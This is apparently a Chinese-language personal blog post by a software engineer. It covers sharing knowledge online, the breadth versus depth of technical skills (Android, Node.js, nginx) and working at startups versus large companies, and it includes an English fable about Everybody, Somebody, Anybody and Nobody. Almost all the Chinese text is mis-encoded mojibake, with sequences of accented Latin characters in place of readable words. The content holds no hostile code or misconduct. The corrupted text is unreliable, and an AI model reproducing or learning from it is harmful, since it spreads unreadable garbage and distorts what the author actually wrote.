é€™äº›è³‡æºéƒ½ä¸æ˜¯ä¸€å¤•ä¹‹é–“ç”¢ç”Ÿçš„ï¼Œè€Œæ˜¯é è¨±å¤šç†±å¿ƒçš„å‰è¼©å€‘ä¸€é»ä¸€æ»´ç´¯ç©èµ·ä¾†ï¼Œæ‰æœ‰è‘—ç¾åœ¨çš„æ¨£è²Œã€‚é€™ä¹Ÿæ˜¯ç‚ºä»€éº¼æˆ‘è¦ºå¾—åˆ†äº«æ˜¯ä¸€ä»¶å¾ˆæ£’çš„äº‹æƒ…ã€‚ç•¶å¤§å®¶éƒ½æ¨‚æ–¼åˆ†äº«çš„æ™‚å€™ï¼Œå°±å¯ä»¥å½¢æˆä¸€å€‹æ­£å‘å¾ªç’°ï¼šã€ŒA æ¥å—åˆ¥äººçš„åˆ†äº«å¾—åˆ°æ”¶ç©« -&gt; A æ±ºå®šè‡ªå·±ä¹Ÿè¦ä¾†åˆ†äº« -&gt; æ›´å¤šäººæ¥å—åˆ¥äººçš„åˆ†äº« -&gt; æ›´å¤šäººæ±ºå®šè‡ªå·±ä¹Ÿè¦ä¾†åˆ†äº«ã€ã€‚
å› ç‚ºå—åˆ°é€™äº›ç¶²è·¯è³‡æºçš„å¹«åŠ©å¯¦åœ¨æ˜¯å¤ªå¤§ï¼Œè®“æˆ‘ä¸‹å®šæ±ºå¿ƒè‡ªå·±ä¹Ÿè¦ç•¶ä¸€å€‹æ¨‚æ–¼åˆ†äº«çš„äººï¼Œä¾†å›é¥‹é‚£äº›æ›¾ç¶“å¹«åŠ©éæˆ‘çš„äººã€‚
ä¸‹é¢æ˜¯ä¸€äº›æˆ‘æ›¾ç¶“åˆ†äº«éçš„å¿ƒå¾—æ–‡ç« ï¼ˆåªåˆ—å‡ºå¹¾ç¯‡æ¯”è¼ƒå¤šäººçœ‹çš„ï¼‰ï¼Œåˆ†æ•£åœ¨ ptt æˆ–è€…æ˜¯æˆ‘çš„å€‹äººéƒ¨è½æ ¼ï¼š

[å¿ƒå¾—] 15å®¶ä¸­å°å‹å…¬å¸ã€æ–°å‰µå…¬å¸é¢è©¦å¿ƒå¾—åˆ†äº«
[æƒ…å ±] å…è²»ç¨‹å¼å…¥é–€æ•™å­¸(å°åŒ—)
[å¿ƒå¾—] åå¹´ç¨‹å¼è‡ªå­¸ä¹‹è·¯
[æ•™å­¸] Line BOT API
[æ•™å­¸] Facebook Messenger API
[Javascript] Promise, generator, asyncèˆ‡ES6
Re: [è«‹ç›Š] å…¥è¡Œä¸åˆ°ä¸€å¹´ï¼Œå»æ–°åŠ å¡ç™¼å±•å¥½å—ï¼Ÿ

ç•¶åˆçš„åˆè¡·ä¸ç‚ºäº†ä»€éº¼ï¼Œå°±åªæ˜¯ç‚ºäº†åˆ†äº«è€Œå·²ã€‚åªæ˜¯è¦ºå¾—è‡ªå·±åœ¨éç¨‹ä¸­æœ‰æ”¶ç©«ï¼Œæ‰€ä»¥æƒ³æŠŠå¿ƒå¾—æ„Ÿæƒ³åˆ†äº«çµ¦å¤§å®¶ã€‚ä¾‹å¦‚èªªæˆ‘è‡ªå·±åšå®Œ Line BOT çš„æ™‚å€™ï¼Œå°±ç™¼ç¾æœ‰ä¸€äº›æµç¨‹å¦‚æœè‡ªå·±æ¢ç´¢ï¼Œå¯èƒ½è¦èŠ±å¾ˆå¤šæ™‚é–“ï¼Œé€™æ™‚å€™æˆ‘å°±æœƒæƒ³æŠŠå¿ƒå¾—å¯«ä¸‹ä¾†ï¼Œè®“ä¹‹å¾Œçš„äººå¯ä»¥åƒè€ƒã€‚
æˆ‘æœƒé‚£éº¼å …æŒåˆ†äº«çš„å¦å¤–ä¸€å€‹ç†ç”±ï¼Œæ˜¯å¸Œæœ›ã€Œæˆ‘ä¹‹å¾Œçš„äººï¼Œéƒ½ä¸è¦å†èµ°ä¸€éæˆ‘èµ°éçš„è·¯ã€ã€‚é€™æ˜¯ä»€éº¼æ„æ€å‘¢ï¼Ÿä¾‹å¦‚èªªæˆ‘è¦åˆ°æ–°åŠ å¡å·¥ä½œä¹‹å‰ï¼Œæ›¾ç¶“åœ¨ç¶²è·¯ä¸ŠæŸ¥äº†å¾ˆå¤šè³‡è¨Šï¼Œç¢ºå¯¦æœ‰å¾ˆå¤šå¯¦ç”¨çš„ï¼Œä½†ä¹Ÿæœ‰ä¸€äº›æ˜¯å¾ˆé›£æŸ¥æˆ–æ˜¯æ ¹æœ¬æŸ¥ä¸åˆ°çš„ã€‚å› æ­¤ç•¶æˆ‘ä¾†æ–°åŠ å¡ä¹‹å¾Œï¼Œæˆ‘å°±å¸Œæœ›æˆ‘èƒ½å¤ åˆ†äº«é€™äº›ã€Œæˆ‘ä»¥å‰æƒ³çŸ¥é“å»æ²’æœ‰äººåˆ†äº«ã€çš„è³‡è¨Šï¼Œè®“é‚£äº›åƒæˆ‘ä¸€æ¨£æƒ³æ‰¾é€™äº›è³‡è¨Šçš„äººæœ‰åœ°æ–¹å¯ä»¥æ‰¾åˆ°ã€‚
æˆ‘è¦ºå¾—é€™å€‹æ¦‚å¿µæœ‰é»åƒé€™ä¸€å€‹ç¶²è·¯ä¸Šæµå‚³çš„æ•…äº‹ï¼š

This is a story about four people named Everybody, Somebody, Anybody and Nobody.  There was an important job to be done and Everybody was sure that Somebody would do it.  Anybody could have done it, but Nobody did it.  Somebody got angry about that, because it was Everybodyâ€™s job.  Everybody thought Anybody could do it, but Nobody realized that Everybody wouldnâ€™t do it.  It ended up that Everybody blamed Somebody when Nobody did what Anybody could have.

æˆ–è€…æ˜¯ g0v çš„åº§å³éŠ˜ï¼š

ã€Œä¸è¦å•ç‚ºä½•æ²’æœ‰äººåšé€™å€‹ï¼Œå…ˆæ‰¿èªä½ å°±æ˜¯ã€æ²’æœ‰äººã€ã€ã€‚å› ç‚ºï¼Œã€Œæ²’æœ‰äººã€æ˜¯è¬èƒ½çš„ã€‚

è·³ä¸‹ä¾†å§ï¼Œè·³ä¸‹ä¾†ç•¶ç¬¬ä¸€å€‹ï¼Œå¹«å¤§å®¶è§£æ±ºé‚£äº›ä½ ä»¥å‰ç¢°éã€æ‰¾ä¸åˆ°è³‡æ–™çš„å•é¡Œï¼Œå¾æ­¤ä»¥å¾Œå°±ä¸æœƒæœ‰äººåƒä½ ç•¶æ™‚ä¸€æ¨£æ‰¾ä¸åˆ°è³‡æ–™äº†ã€‚
è€Œä¸”æœ‰æ™‚å€™åˆ†äº«ä¹Ÿæœƒå¸¶ä¾†ä¸€äº›æ„æƒ³ä¸åˆ°çš„å›å ±ï¼Œä¾‹å¦‚èªªä½ å»é¢è©¦çš„æ™‚å€™å¯èƒ½é¢è©¦å®˜æœƒè·Ÿä½ èªªï¼šã€Œæˆ‘å¥½åƒçœ‹éä½ çš„æ–‡ç« ã€ã€‚æˆ–è€…æ˜¯å¯èƒ½æœ‰ä¸€äº›ç¨‹å¼ç›¸é—œçš„æ©Ÿæ§‹æœƒæ‰¾ä½ å»è¬›èª²ï¼Œæˆ–æ˜¯ä¸€äº›æ–°èåª’é«”ç¶²ç«™çš„è¨ªå•ç­‰ç­‰ã€‚é€™äº›éƒ½æ˜¯åœ¨å¯«æ–‡ç« çš„æ™‚å€™æ²’æœ‰é æ–™åˆ°çš„ã€‚ä½†é‚„æ˜¯è¦å†ä¸‰å¼·èª¿ï¼Œå¦‚æœä½ æ˜¯ç‚ºäº†é€™äº›é¡å¤–çš„å›å ±æ‰åˆ†äº«çš„è©±ï¼Œå°±å¤±å»äº†åˆ†äº«çš„åˆè¡·ã€‚åˆè¡·å¾ˆé‡è¦ï¼Œé‚£æ˜¯å”¯ä¸€èƒ½å¤ æ”¯æŒä½ é•·ä¹…ç¶“ç‡Ÿä¸‹å»çš„å‹•åŠ›ã€‚
æœ‰äº›äººæœƒè¦ºå¾—ï¼šã€Œæˆ‘é‚£éº¼èœï¼Œå“ªæœ‰ä»€éº¼å¯ä»¥åˆ†äº«ï¼Ÿã€ã€‚ä½†å…¶å¯¦æ˜¯æœ‰çš„ï¼Œå› ç‚ºä½ ç¸½æ˜¯æœƒæ‰¾åˆ°æ¯”ä½ æ›´èœçš„äººã€‚ä½ å­¸ç¨‹å¼ä¸€å€‹æœˆï¼Œç¸½æ˜¯å¯ä»¥æ‰¾åˆ°å­¸ç¨‹å¼ 15 å¤©çš„äººï¼Œæˆ‘ç”šè‡³è¦ºå¾—ç¨‹å¼å…¥é–€é€™ç¨®æ±è¥¿ï¼Œæ‡‰è©²ç”±ã€Œæ–°æ‰‹ã€ä¾†æ•™ã€Œè¶…ç´šæ–°æ‰‹ã€ï¼Œç‚ºä»€éº¼ï¼Ÿå› ç‚ºé‚£äº›æ–°æ‰‹å¯èƒ½ä¸€å€‹ç¦®æ‹œå‰è·Ÿä½ ä¸€æ¨£å¡åœ¨è¿´åœˆï¼Œä¸çŸ¥é“è¿´åœˆåˆ°åº•å¯ä»¥åšä»€éº¼ï¼Œä½†æ˜¯é€™ç¦®æ‹œä»–å°±é ˜æ‚Ÿäº†ã€‚æˆ‘è¦ºå¾—é€™æ™‚å€™æ˜¯æœ€é©åˆæ•™å­¸çš„æ™‚æ©Ÿï¼Œå› ç‚ºä»–å€‘é‚„è¨˜å¾—ã€Œç•¶åˆå¡ä½çš„é‚£ç¨®å¿ƒæƒ…ã€ï¼Œä»–å€‘æ˜¯æœ€æ‡‚ä½ å¿ƒæƒ…çš„äººã€‚
åƒæˆ‘æ¥è§¸ç¨‹å¼é€™éº¼ä¹…ï¼Œä½ å•æˆ‘ç•¶åˆç¬¬ä¸€æ¬¡å­¸éè¿´çš„æ™‚å€™æ˜¯ä»€éº¼æ„Ÿè¦ºï¼Œæˆ‘çœŸçš„å®Œå…¨å¿˜äº†ã€‚æ¥è§¸ä¹…äº†ä»¥å¾Œï¼Œå¯«ç¨‹å¼å°±åƒåƒé£¯å–æ°´ä¸€æ¨£ï¼Œä½ å•æˆ‘æ€éº¼åƒé£¯æ€éº¼å–æ°´ï¼Œæˆ‘åªèƒ½è·Ÿä½ èªªï¼šã€Œé˜¿ä¸å°±æŠŠå˜´å¼µé–‹åƒé£¯å—ï¼Ÿé€™å€‹è¦æ€éº¼æ•™ï¼Ÿã€ã€‚
æ‰€ä»¥å„˜ç®¡ä½ è¦ºå¾—ä½ å¾ˆèœï¼Œä½ é‚„æ˜¯å¯ä»¥è©¦è‘—å¯«ä¸‹è‡ªå·±å­¸ç¿’ç¨‹å¼çš„å¿ƒå¾—ï¼Œä»¥åŠè‡ªå·±å¡é—œçš„åœ°æ–¹è·Ÿä¹‹å¾Œæ€éº¼è§£é–‹çš„æ–¹æ³•ï¼Œç›¸ä¿¡ä¸€å®šæœƒå°æ¯”ä½ æ›´èœçš„äººæœ‰å¹«åŠ©ã€‚åƒæˆ‘ç¾åœ¨å¯«çš„å¾ˆå¤šæ–‡ç« æŠ€è¡“æ·±åº¦ä¹Ÿå¾ˆæ·ºï¼Œä½†é‚„æ˜¯å¹«åŠ©äº†å¾ˆå¤šäººä¸€æ¨£ã€‚
å»£åº¦ vs æ·±åº¦æŠ€è¡“çš„å»£åº¦è·Ÿæ·±åº¦åˆ°åº•å“ªä¸€å€‹é‡è¦ï¼ˆæˆ–è€…å…¶å¯¦æ ¹æœ¬ä¸€æ¨£é‡è¦ï¼‰ï¼Œä¸€ç›´æ˜¯ä¸€å€‹çˆ­è«–çš„è©±é¡Œã€‚æœ‰äº›äººè¦ºå¾—ä½ çŸ¥é“çš„å¾ˆå¤šã€å¾ˆå»£å¾ˆå¥½ï¼Œä»£è¡¨å„å€‹åœ°æ–¹ä½ éƒ½æ‡‚ä¸€é»ï¼Œä½†ç¼ºé»å°±æ˜¯æ¯ä¸€å€‹åœ°æ–¹éƒ½ä¸å¤ æ·±å…¥ã€‚æœ‰äº›äººè¦ºå¾—æ·±åº¦æ‰æ˜¯ç‹é“ï¼Œæ‰èƒ½æˆç‚ºæŸä¸€å€‹ç‰¹å®šé ˜åŸŸçš„å°ˆå®¶ï¼Œæ“æœ‰ç¨ç‰¹çš„æŠ€è¡“æ´è¦‹ã€‚
æˆ‘å¯ä»¥å¾ˆå¦ç™½åœ°æ‰¿èªï¼Œæˆ‘æ˜¯ä¸€å€‹æœ‰å»£åº¦æ²’æ·±åº¦çš„äººï¼Œæˆ‘ä¹‹å‰å¯«éä¸€å¹´çš„ Androidï¼Œæœ‰å¯«éä¸€å€‹å³æ™‚é€šè¨Š Appï¼Œä¹Ÿæœ‰ç¶­è­·ä¸¦æ›´æ–°éä¸€å¥—å…¬å¸å…§éƒ¨çš„ SDKï¼Œä¸¦ä¸”å°å…¥ç†±æ›´æ–°çš„æŠ€è¡“ã€‚å¯æ˜¯å¦‚æœä½ å«æˆ‘å»é¢è©¦ Android å·¥ç¨‹å¸«ï¼Œæˆ‘é‚„çœŸçš„ä¸æ•¢å»ï¼Œä¸€å®šè¢«é›»å¾—å”å“©å˜©å•¦ã€‚æˆ‘å¯ä»¥ç¨ç«‹å®Œæˆä¸€å€‹ Android Appï¼Œé€™å€‹æ±ºå®šæ²’å•é¡Œï¼Œä½†å¦‚æœä½ è¦å•æˆ‘ä¸€äº›æ›´æ·±çš„å•é¡Œï¼Œä¾‹å¦‚èªªä¸€å€‹ Activity è¢«å‰µå»ºçš„æ•´å€‹æµç¨‹ï¼Œæˆ–è€…æ˜¯æŸå€‹ library çš„åº•å±¤å¯¦ä½œï¼Œé€™äº›æˆ‘å…¨éƒ¨éƒ½å›ç­”ä¸å‡ºä¾†ã€‚
æ‰€ä»¥ä½ èªªæˆ‘æœƒå¯« Android å—ï¼Ÿå¥½åƒæœƒï¼Œåˆå¥½åƒä¸å¤ªæœƒã€‚
æˆ‘ä¹‹å‰å¯«éä¸€å¹´çš„ Node.jsï¼Œå¯ä»¥ç¨ç«‹åšå‡ºä¸€å€‹å¾Œç«¯æœå‹™ï¼ŒåŒ…æ‹¬è³‡æ–™åº«ï¼ˆMySQLï¼‰ã€å¿«å–ï¼ˆRedisï¼‰ä»¥åŠéƒ¨ç½²ï¼ŒNginx çš„è¨­å®šæˆ‘ä¹Ÿä¸é™Œç”Ÿï¼Œåªæ˜¯çœŸçš„è¦ç”¨çš„æ™‚å€™é‚„æ˜¯è¦æŸ¥æ–‡ä»¶å°±æ˜¯äº†ã€‚å¯æ˜¯å¦‚æœä½ å«æˆ‘å»é¢è©¦ Node.js å·¥ç¨‹å¸«ï¼Œæˆ‘ä¹Ÿæœƒè¢«é›»å¾—ä¸€å¡Œç³Šå¡—ï¼Œè¢«å•åˆ° Node.js æ›´æ·±å…¥çš„å•é¡Œçš„æ™‚å€™æˆ‘å°±å›ç­”ä¸å‡ºä¾†äº†ã€‚ä¾‹å¦‚èªª Node.js çš„åº•å±¤å¯¦ä½œæˆ–è€…æ˜¯ this ä»£è¡¨ä»€éº¼ä¹‹é¡çš„ã€‚
æ‰€ä»¥ä½ èªªæˆ‘æœƒå¯« Node.js å—ï¼Ÿå¥½åƒæœƒï¼Œåˆå¥½åƒä¸å¤ªæœƒã€‚
å…¶å¯¦å°æ–¼å»£åº¦è·Ÿæ·±åº¦åˆ°åº•å“ªä¸€å€‹é‡è¦çš„é€™ä»¶äº‹æƒ…ï¼Œæˆ‘åˆ°ç¾åœ¨é‚„æ˜¯å¾ˆè¿·æƒ˜ã€‚
å› ç‚ºæˆ‘çš„ç¢ºæœ‰é«”é©—åˆ°å»£åº¦çš„é‡è¦æ€§ã€‚ä¾‹å¦‚èªªæˆ‘ç¾åœ¨é›–ç„¶æ˜¯ä¸€å€‹å‰ç«¯å·¥ç¨‹å¸«ï¼Œä½†å¦‚æœä½ çœŸçš„åªæ‡‚å‰ç«¯ï¼ˆHTML, CSS, JavaScriptï¼‰çš„è©±ï¼Œå…¶å¯¦æœ‰å¾ˆå¤šå•é¡Œä½ æ˜¯è§£ä¸é–‹çš„ã€‚åƒæ˜¯æˆ‘æœ€è¿‘å¯«çš„ä¸€å€‹ Single Page Applicationï¼Œç¶²å€ä¸Šé¢ä¸æƒ³ç”¨ # é€™å€‹ç¬¦è™Ÿï¼Œè€Œæ˜¯æƒ³è¦é•·å¾—è·Ÿæ­£å¸¸é€£çµä¸€æ¨£ã€‚
ä¾‹å¦‚èªªåŸæœ¬çš„å¯èƒ½æ˜¯http://example.com/#/homeï¼Œæˆ‘æƒ³è®“ä»–è®Šæˆhttp://example.com/homeï¼Œé€™å€‹è¦æ€éº¼è¨­å®šå‘¢ï¼Ÿ
å› ç‚ºæˆ‘æœ‰ç¢°é nginxï¼Œæ‰€ä»¥æˆ‘å°±çŸ¥é“èªªé€™å€‹å¯ä»¥åˆ©ç”¨ nginx ä¾†è¨­ï¼ŒæŠŠé‚£äº›è·¯å¾‘éƒ½å°åˆ°index.htmlå»å°±å¥½äº†ã€‚ä½†å¦‚æœä½ æ ¹æœ¬ä¸çŸ¥é“ nginx åœ¨å¹¹å˜›ï¼Œç”šè‡³ä¸çŸ¥é“æœ‰é€™å€‹æ±è¥¿å­˜åœ¨çš„æ™‚å€™ï¼Œé€™å€‹å•é¡Œå°ä½ ä¾†èªªå¯èƒ½å°±æœƒæ¯”è¼ƒé›£è§£ã€‚
æœ‰é—œå»£åº¦çš„è©±ï¼Œæˆ‘èªç‚ºç„¡è«–ä½ åšå“ªä¸€å€‹é ˜åŸŸï¼Œéƒ½ä¸å¯èƒ½å°å…¶ä»–é ˜åŸŸã€Œä¸€ç„¡æ‰€çŸ¥ã€ï¼Œè‡³å°‘è¦çŸ¥é“è·Ÿä½ æœ‰åˆä½œé—œä¿‚çš„é ˜åŸŸå¤§æ¦‚åœ¨å¹¹å˜›ï¼Œä¸ç„¶æœƒå¾ˆå›°æ“¾ã€‚ä¾‹å¦‚èªªåšå‰ç«¯çš„å°±è¦æ‡‚ä¸€é»å¾Œç«¯ã€æ‡‚ä¸€é» Mobileã€‚é€™æ¨£åœ¨è·Ÿé‚£äº›é ˜åŸŸçš„å·¥ç¨‹å¸«åˆä½œæ™‚æ‰æœƒæ¯”è¼ƒé †æš¢ã€‚
åŒæ™‚ï¼Œæˆ‘ä¹Ÿæœ‰é«”é©—åˆ°æ·±åº¦çš„é‡è¦æ€§ã€‚
ç•¶ä½ çš„æŠ€è¡“æ·±åº¦ä¸è¶³æ™‚ï¼Œæœ‰äº›å•é¡Œæ˜¯æœƒå¡ä½ã€è§£ä¸é–‹çš„ã€‚ä¾‹å¦‚èªªä½ ä»Šå¤©ç”¨ CSS æ’ç‰ˆï¼Œç”¨äº†ä¸€å€‹å¥—ä»¶ä¹‹å¾Œç™¼ç¾æœ‰ä¸€å€‹ div çš„å…§å®¹çœ‹ä¸è¦‹äº†ï¼Œä½†æ˜¯æŠŠå¥—ä»¶æ‹¿æ‰å°±å‡ºç¾äº†ã€‚å¦‚æœä½ åªæœƒåŸºæœ¬çš„ CSSï¼Œä¸çŸ¥é“é‚£äº› position, z-index æ€éº¼èª¿æ•´çš„æ™‚å€™ï¼Œä½ å°±å¾ˆé›£å»è§£æ±ºé€™å€‹å•é¡Œã€‚
åˆæˆ–è€…æ˜¯æˆ‘å‰é™£å­åšç›´æ’­ï¼Œåœ¨ hls çš„ player ä¸Šé¢ç¢°åˆ°å•é¡Œï¼Œç™¼ç¾æœ‰æ™‚å€™è¼‰å…¥çš„æƒ…å½¢å¾ˆå¥‡æ€ªã€‚æˆ‘æœ‰å˜—è©¦éå»é–±è®€æ’­æ”¾å™¨çš„æºç¢¼ï¼Œä½†ç¤™æ–¼æˆ‘æŠ€è¡“å¯¦åŠ›ä¸è¶³ï¼Œä»¥åŠå°å°ˆæœ‰åè©è·Ÿæ•´å€‹æ’­æ”¾éç¨‹ä¸å¤ªç†è§£ï¼Œæœ€å¾Œé‚„æ˜¯ä¸çŸ¥é“è¦æ€éº¼è§£æ±ºé€™å€‹å•é¡Œã€‚
åœ¨é¢è©¦çš„æ™‚å€™ä¹Ÿæœ‰å¯Ÿè¦ºåˆ°æ·±åº¦çš„é‡è¦æ€§ï¼Œæˆ–è€…èªªæ˜¯ä¸€äº›ã€Œç´®å¯¦åŸºç¤ã€çš„é‡è¦æ€§ã€‚ä¾‹å¦‚èªªé¢è©¦å®˜å¯èƒ½æœƒå•ä½ ã€Œè³‡æ–™åº«çš„ index æ˜¯ä»€éº¼ï¼Ÿã€ï¼Œæˆ‘å¤§æ¦‚åªèƒ½å›ç­”åˆ°ã€ŒåŠ  index ä¹‹å¾Œèƒ½è®“æŸ¥è©¢çš„é€Ÿåº¦è®Šå¿«ã€é€™æ¨£å­å¾ˆæ·ºçš„å›è¦†ã€‚ä½†åŸºç¤ç´®å¯¦çš„äººèƒ½å¤ å›ç­”åˆ°æœ‰å“ªäº› indexï¼Œæ¯ä¸€ç¨®çš„å·®åˆ¥åœ¨å“ªè£¡ï¼Œä»¥åŠ index åœ¨è³‡æ–™åº«åº•å±¤æ˜¯æ€éº¼å¯¦ä½œçš„ã€‚
æˆ‘è‡ªå·±ä¸€è·¯èµ°ä¾†ï¼Œå› ç‚ºå¾ˆæ„›ç©ä¸€äº›æœ‰çš„æ²’çš„ï¼Œæ‰€ä»¥æŠ€è¡“å»£åº¦æ‡‰è©²æ˜¯é‚„ okï¼Œä½†æŠ€è¡“æ·±åº¦å°±çœŸçš„ä¸è¶³äº†ã€‚å¸Œæœ›è‡ªå·±ä¹‹å¾Œèƒ½èµ°å¾—æ›´æ·±ä¸€é»ï¼ŒåŸºç¤æ‰“çš„æ›´ç´®å¯¦ã€‚
å°å…¬å¸ vs å¤§å…¬å¸é€™ä¹Ÿæ˜¯åœ¨è·æ¶¯é¸æ“‡ä¸Šä¸€å€‹è¨è«–åº¦å¾ˆé«˜çš„è©±é¡Œï¼Œè€Œæˆ‘è¦ºå¾—é€™å€‹é¸æ“‡å…¶å¯¦è·Ÿä¸Šé¢èªªçš„å»£åº¦èˆ‡æ·±åº¦çš„è©±é¡Œä¹Ÿæœ‰é»é—œä¿‚ã€‚
ä»¥æˆ‘è‡ªå·±å¾…éæ–°å‰µå…¬å¸çš„ç¶“é©—ï¼Œé€²å»ä¹‹å¾Œå°±æ˜¯ä½ ä¸€å€‹äººå¯èƒ½æœƒè² è²¬å¾ˆå¤šå€‹å°ˆæ¡ˆï¼ˆä¾‹å¦‚èªªåŒæ™‚è² è²¬ Android è·Ÿç¶²é å‰å¾Œç«¯ï¼Œå¦‚æœä½ æœ‰èƒ½åŠ›çš„è©±ï¼‰ï¼Œé€™æ™‚å€™ä½ å°±èƒ½æ‹“å±•ä½ çš„æŠ€è¡“å»£åº¦ï¼Œå­¸åˆ°å¾ˆå¤šä¸åŒçš„æŠ€è¡“ã€‚ä½†æ˜¯æŠŠæ™‚é–“è·Ÿè³‡æºåˆ†é…åœ¨é€™éº¼å¤šä¸åŒçš„é ˜åŸŸä¸Šé¢ï¼Œç¼ºé»å°±æ˜¯æ·±åº¦ä¸å¤ æ·±ï¼Œå°±å¯èƒ½åƒæˆ‘å‰›å‰›è¬›çš„é‚£äº›ï¼Œä½ æ±è¥¿å¯«çš„å‡ºä¾†ï¼Œä½†æ˜¯å›ç­”ä¸å‡ºæ›´æ·±çš„å•é¡Œã€‚
å¤§å…¬å¸çš„è©±ï¼Œå› ç‚ºæˆ‘è‡ªå·±æ²’æœ‰å¾…éï¼Œæ‰€ä»¥åªèƒ½çŒœæ¸¬ä¸€ä¸‹åœ¨åšä»€éº¼ï¼Œæ‡‰è©²æ˜¯å°ˆé–€è² è²¬æŸä¸€å€‹é ˜åŸŸï¼Œä¾‹å¦‚èªªæœ‰ä¸€å€‹å°ˆæ¥­çš„ Android åœ˜éšŠï¼Œå¯èƒ½æœ‰äº”å…­å€‹äººï¼Œä¸€å€‹ Team leaderã€å…©ä¸‰å€‹ senior å·¥ç¨‹å¸«å¸¶è‘— junior ä¹‹é¡çš„ã€‚ä½ è¢«åˆ†åˆ°çš„å¯èƒ½æ˜¯ä¸€å€‹å¾ˆå°çš„åŠŸèƒ½ï¼Œè¦ç…§è‘—å¤§å®¶è¨‚ä¸‹ä¾†çš„è¦å‰‡å»å¯« codeï¼Œå¯«å®Œä¹‹å¾Œè¦åš code reviewï¼Œæ¸¬è©¦æ²’å•é¡Œä¹‹å¾Œæ‰èƒ½ä¸Šç·šã€‚åœ¨é€™é‚Šï¼Œä½ å¯èƒ½å¯ä»¥èŠ±ä¸€å€‹æœˆåªå»ç ”ç©¶ä¸€äº›æ€§èƒ½å„ªåŒ–çš„å•é¡Œã€‚
æˆ‘è‡ªå¾ç¬¬ä¸€é–“æ˜¯å¾…æ–°å‰µå…¬å¸ï¼Œå¾…ä¸€å¹´å¤šä¹‹å¾Œå…¶å¯¦æƒ³æ›åˆ°å¤§å…¬å¸å»å·¥ä½œã€‚ç‚ºä»€éº¼ï¼Ÿå› ç‚ºæˆ‘æƒ³é«”é©—å¤§å…¬å¸çš„é–‹ç™¼æµç¨‹ã€‚åœ¨å¾ˆå¤šæ–°å‰µå…¬å¸ï¼Œé–‹ç™¼éƒ½æ²’æœ‰ä»€éº¼æµç¨‹ï¼Œè¦å‰‡æ¯”è¼ƒé¬†æ•£ã€‚ä¾‹å¦‚èªªæˆ‘è‡ªå·±ä¸€å€‹äººè² è²¬é‚£æ•´å€‹å°ˆæ¡ˆçš„è©±ï¼Œæˆ‘è¦ä¸è¦å¯«æ¸¬è©¦ã€ç¨‹å¼ç¢¼é¢¨æ ¼è¦ä¸è¦çµ±ä¸€ï¼Œé€™ä¸€åˆ‡éƒ½å–æ±ºæ–¼åœ¨æˆ‘ã€‚æœ‰ä¹Ÿå¯ä»¥ï¼Œä½†æ²’æœ‰ä¹Ÿå¯ä»¥ï¼Œæ²’æœ‰äººæœƒç®¡ä½ ï¼Œä½†æ˜¯ä¹Ÿæ²’æœ‰äººæœƒçµ¦ä½ ä¸€äº›å»ºè­°ã€‚å„ªé»æ˜¯éå¸¸è‡ªç”±ï¼Œç¼ºé»å°±æ˜¯æ²’æœ‰äººå¸¶ã€‚
æ‰€ä»¥å¾…ä¹…ä¹‹å¾Œï¼Œå°±æœƒæƒ³é«”é©—ä¸€ä¸‹å¤§å…¬å¸çš„é–‹ç™¼æµç¨‹åˆ°åº•é•·æ€æ¨£ï¼Œæƒ³è¦è©¦è©¦çœ‹è·Ÿåˆ¥äººåˆ†å·¥ï¼Œè€Œä¸å†æ˜¯è‡ªå·±ä¸€å€‹äººåšä¸€å€‹å°ˆæ¡ˆã€‚æœ‰äººå¯ä»¥äº’ç›¸è¨è«–ã€äº’ç›¸æŒ‡é»ï¼Œå½¼æ­¤æ•™å­¸ç›¸é•·ã€‚
ä¸éç„¡è«–æ˜¯å“ªä¸€ç¨®é¡å‹çš„å…¬å¸ï¼Œæˆ‘è¦ºå¾—æœ€é‡è¦çš„é‚„æ˜¯ã€Œæ‰¾ä¸€ä»½å¯ä»¥å­¸åˆ°æ±è¥¿çš„å·¥ä½œã€ã€‚é€™å€‹é“ç†å¾ˆç°¡å–®ï¼Œä½ ä¸€å¤©å¿…é ˆèŠ±å…«å€‹å°æ™‚åœ¨é€™ä¸€ä»½å·¥ä½œä¸Šé¢ï¼Œå¦‚æœä½ åœ¨é€™ä»½å·¥ä½œå·²ç¶“æ‰¾ä¸åˆ°ä»€éº¼å¯ä»¥å­¸ç¿’äº†ï¼Œé‚£ä½ çš„æˆé•·å°±åœæ»¯äº†ã€‚é›–ç„¶ç•¶å€‹è–ªæ°´å°å·é ˜é€™äº›è–ªæ°´ä¹Ÿå¾ˆä¸éŒ¯ï¼Œä½†æˆ‘è¦ºå¾—ä½ ä¹Ÿå¿…é ˆè€ƒæ…®åˆ°ä½ ä¹‹å¾Œçš„è·æ¶¯ç™¼å±•ï¼ˆé™¤éé€™ä»½å·¥ä½œä½ æœ¬ä¾†å°±æ˜¯è¦é¤Šè€ç”¨çš„ï¼‰ã€‚è¦æ‰¾ä¸€ä»½å­¸å¾—åˆ°çš„æ±è¥¿çš„å·¥ä½œï¼Œä½ æ‰èƒ½é‚Šå·¥ä½œé‚Šæˆé•·ï¼Œå°ä½ è‡ªå·±çš„ç”Ÿæ¶¯ç™¼å±•ä¹Ÿæœƒæ›´é †åˆ©ä¸€é»ã€‚
è¦çœŸçš„ç—›éï¼Œæ‰èƒ½ç†è§£æˆ‘ä¹‹å‰æœ‰ä¸€é™£å­ï¼Œæ¯ä¸€å¤©éƒ½æœƒæ‰“é–‹ä¸€äº›æŠ€è¡“æ–‡ç« çš„ç¶²ç«™ï¼ŒæŠŠå‰å¹¾åéƒ½é»é–‹ä¾†çœ‹ã€‚é‚£æ™‚å€™è¦ºå¾—è‡ªå·±å­¸åˆ°å¥½å¤šæ±è¥¿ï¼Œå­¸åˆ°äº†å¤§å‹åˆ†æ•£å¼ç³»çµ±æ€éº¼å»ºçš„ã€å­¸åˆ°äº†çŸ¥åç¶²è·¯å…¬å¸æ˜¯æ€éº¼ç®¡ç†è»Ÿé«”é–‹ç™¼æµç¨‹ã€å­¸åˆ°äº†è¨±å¤šä»¥å‰ä¸çŸ¥é“çš„å¯†æŠ€ã€‚å¯æ˜¯æˆ‘æ¼¸æ¼¸ç™¼ç¾ï¼Œè‡ªå·±å¥½åƒå…¶å¯¦ä»€éº¼éƒ½æ²’å­¸åˆ°ã€‚
